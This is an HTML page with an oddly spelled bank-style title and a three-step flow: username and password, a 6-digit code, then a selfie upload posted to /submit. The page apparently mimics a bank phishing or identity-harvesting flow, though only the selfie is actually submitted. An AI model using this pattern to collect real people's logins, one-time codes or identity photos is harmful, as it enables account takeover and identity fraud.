<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BankwirhStyleandFamilywithOpeace</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

  <div class="card" id="step1">
    <h1>Welcome</h1>
    <h2>Sign In</h2>
    <input type="text" placeholder="Username">
    <input type="password" placeholder="Password">
    <button onclick="goStep2()">Continue</button>

    <p class="divider">or</p>

    <h2>Sign Up</h2>
    <input type="text" placeholder="Full Name">
    <input type="email" placeholder="Email">
    <input type="password" placeholder="Password">
    <button onclick="goStep2()">Register</button>
  </div>

  <div class="card hidden" id="step2">
    <h2>Enter Code</h2>
    <input type="text" placeholder="6-digit code" maxlength="6">
    <button onclick="goStep3()">Verify</button>
  </div>

  <div class="card hidden" id="step3">
    <h2>Upload Selfie</h2>
    <form action="/submit" method="POST" enctype="multipart/form-data">
      <input type="file" name="selfie" accept="image/*" required>
      <button type="submit">Confirm</button>
    </form>
  </div>

</div>

<script>
function goStep2() {
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
}
function goStep3() {
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step3').classList.remove('hidden');
}
</script>

</body>
</html>
